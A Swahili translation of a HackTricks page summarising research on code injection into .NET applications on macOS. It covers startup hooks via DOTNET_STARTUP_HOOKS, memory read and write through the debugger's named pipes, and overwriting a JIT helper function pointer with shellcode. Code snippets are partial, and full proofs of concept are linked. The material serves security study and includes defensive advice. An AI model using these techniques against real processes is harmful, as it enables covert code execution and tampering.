# Injection ya Applications za .Net kwenye macOS

{{#include ../../../banners/hacktricks-training.md}}

**Huu ni muhtasari wa post [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/). Isome kwa maelezo zaidi!**<sup>[[1]](#references)</sup>

## `DOTNET_STARTUP_HOOKS`

.NET Core 3.0 na matoleo ya baadaye yanaunga mkono environment variable ya `DOTNET_STARTUP_HOOKS`. Kila path lazima itambue managed assembly iliyo na aina ya kimataifa ya `StartupHook` yenye method ya `public static void Initialize()`. Host hupakia assemblies hizo na kuita initializers zake kwa njia ya synchronous kabla ya entry point ya application's `Main`, hivyo kutoa udhibiti wa environment pamoja na primitive ya moja kwa moja ya pre-main code-execution kupitia DLL inayoweza kusomeka.<sup>[[2]](#references)</sup>
```csharp
// StartupHook.cs — compile as a class-library assembly.
using System.IO;

internal class StartupHook
{
public static void Initialize()
{
File.WriteAllText("/tmp/dotnet-startup-hook-executed", "executed\n");
}
}
```

```bash
dotnet new classlib -n StartupHookPayload -f net8.0
cp StartupHook.cs StartupHookPayload/Class1.cs
dotnet build StartupHookPayload -c Release

DOTNET_STARTUP_HOOKS="$PWD/StartupHookPayload/bin/Release/net8.0/StartupHookPayload.dll" \
dotnet /path/to/TargetApplication.dll
```
Hook assembly lazima iendane na runtime na dependencies za application. Relative paths zenye directory separators hukataliwa; tumia absolute path au assembly name inayoweza kutatuliwa kutoka default load context. Startup hooks zimezimwa kwa default katika trimmed applications, na custom native hosts wanaweza kutoa runtime properties moja kwa moja badala ya kurithi environment.<sup>[[2]](#references)</sup>

Defensive launchers zinapaswa kuondoa `DOTNET_STARTUP_HOOKS`, kuzuia writes zisizoaminika kwenye application na shared assembly paths, na kujaribu deployments za self-contained na trimmed kando.

## .NET Core Debugging <a href="#net-core-debugging" id="net-core-debugging"></a>

### **Kuanzisha Debugging Session** <a href="#net-core-debugging" id="net-core-debugging"></a>

Ushughulikiaji wa mawasiliano kati ya debugger na debuggee katika .NET unasimamiwa na [**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp). Kipengele hiki huanzisha named pipes mbili kwa kila .NET process, kama inavyoonekana katika [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127), ambazo huanzishwa kupitia [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27). Pipes hizi huishia kwa **`-in`** na **`-out`**.

Kwa kutembelea **`$TMPDIR`** ya mtumiaji, mtu anaweza kupata debugging FIFOs zinazopatikana kwa ajili ya debugging .Net applications.

[**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) inawajibika kusimamia mawasiliano kutoka kwa debugger. Ili kuanzisha debugging session mpya, debugger lazima itume ujumbe kupitia `out` pipe unaoanza na struct ya `MessageHeader`, iliyoelezwa katika source code ya .NET:
```c
struct MessageHeader {
MessageType   m_eType;        // Message type
DWORD         m_cbDataBlock;  // Size of following data block (can be zero)
DWORD         m_dwId;         // Message ID from sender
DWORD         m_dwReplyId;    // Reply-to Message ID
DWORD         m_dwLastSeenId; // Last seen Message ID by sender
DWORD         m_dwReserved;   // Reserved for future (initialize to zero)
union {
struct {
DWORD         m_dwMajorVersion;   // Requested/accepted protocol version
DWORD         m_dwMinorVersion;
} VersionInfo;
...
} TypeSpecificData;
BYTE          m_sMustBeZero[8];
}
```
Ili kuomba session mpya, struct hii hujazwa kama ifuatavyo, kwa kuweka aina ya ujumbe kuwa `MT_SessionRequest` na toleo la protocol kuwa toleo la sasa:
```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Configure the message type and version
sSendHeader.m_eType = MT_SessionRequest;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```
Kichwa hiki kisha hutumwa kwa target kwa kutumia syscall ya `write`, kikifuatiwa na struct ya `sessionRequestData` iliyo na GUID ya session:
```c
write(wr, &sSendHeader, sizeof(MessageHeader));
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));
write(wr, &sDataBlock, sizeof(SessionRequestData));
```
Operesheni ya kusoma kwenye pipe ya `out` inathibitisha kufanikiwa au kushindwa kwa uanzishaji wa debugging session:
```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```
## Kusoma Kumbukumbu

Mara tu kipindi cha debugging kitakapoanzishwa, memory inaweza kusomwa kwa kutumia aina ya ujumbe [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896). Kazi ya readMemory imefafanuliwa kwa kina, ikifanya hatua zinazohitajika kutuma ombi la kusoma na kupata jibu:
```c
bool readMemory(void *addr, int len, unsigned char **output) {
// Allocation and initialization
...
// Write header and read response
...
// Read the memory from the debuggee
...
return true;
}
```
Uthibitisho kamili wa dhana (POC) unapatikana [hapa](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b).

## Kuandika Kumbukumbu

Vilevile, kumbukumbu inaweza kuandikwa kwa kutumia function ya `writeMemory`. Mchakato unahusisha kuweka aina ya ujumbe kuwa `MT_WriteMemory`, kubainisha anwani na urefu wa data, kisha kutuma data:
```c
bool writeMemory(void *addr, int len, unsigned char *input) {
// Increment IDs, set message type, and specify memory location
...
// Write header and data, then read the response
...
// Confirm memory write was successful
...
return true;
}
```
The associated POC is available [here](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5).

## .NET Core Code Execution <a href="#net-core-code-execution" id="net-core-code-execution"></a>

Ili kutekeleza code, ni lazima kutambua memory region yenye ruhusa za rwx, jambo linaloweza kufanywa kwa kutumia vmmap -pages:
```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```
Kutupata mahali pa kuandika upya function pointer ni muhimu, na katika .NET Core, hili linaweza kufanywa kwa kulenga **Dynamic Function Table (DFT)**. Jedwali hili, lililofafanuliwa katika [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h), hutumiwa na runtime kwa JIT compilation helper functions.

Kwa mifumo ya x64, signature hunting inaweza kutumika kupata rejeleo la symbol `_hlpDynamicFuncTable` katika `libcorclr.dll`.

Debugger function `MT_GetDCB` hutoa taarifa muhimu, ikiwemo address ya helper function, `m_helperRemoteStartAddr`, inayoonyesha mahali `libcorclr.dll` ilipo katika process memory. Address hii hutumiwa kuanzisha utafutaji wa DFT na kuandika upya function pointer kwa address ya shellcode.

Msimbo kamili wa POC wa injection ndani ya PowerShell unapatikana [hapa](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6).

## References

- [1] [Adam Chester (xpnsec) - Injection ya macOS kupitia Third Party Frameworks](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)
- [2] [Muundo wa host startup hook wa .NET runtime](https://github.com/dotnet/runtime/blob/main/docs/design/features/host-startup-hook.md)
{{#include ../../../banners/hacktricks-training.md}}
